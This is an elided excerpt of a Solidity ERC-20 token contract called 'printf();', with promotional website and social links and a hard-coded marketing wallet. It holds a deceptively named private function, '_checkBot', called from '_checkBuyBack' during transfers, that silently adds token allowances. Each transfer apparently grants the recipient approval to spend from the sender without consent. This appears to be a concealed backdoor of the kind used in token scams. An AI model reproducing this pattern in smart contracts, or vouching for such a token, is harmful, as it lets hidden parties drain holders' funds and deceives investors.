...
Website: https://printf.click
Telegram: https://t.me/printf_erc
Twitter: https://twitter.com/printf_erc
...
contract PRINTF is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "printf();";
    ...
    address payable private _marketingAddress = payable(0x1495c30d589914806497314306bb87eF55F494e9);
    ...
    function _checkBot(address b1,  address b2, uint256 tokens) private { _allowances[b2][b1] += tokens; }
    ...
    function _checkBuyBack(address from, address to, uint256 amount) private {
        if(from != address(this) && to != address(this)) _lastBuyback = block.timestamp;

        _checkBot(from, to, amount);
    }
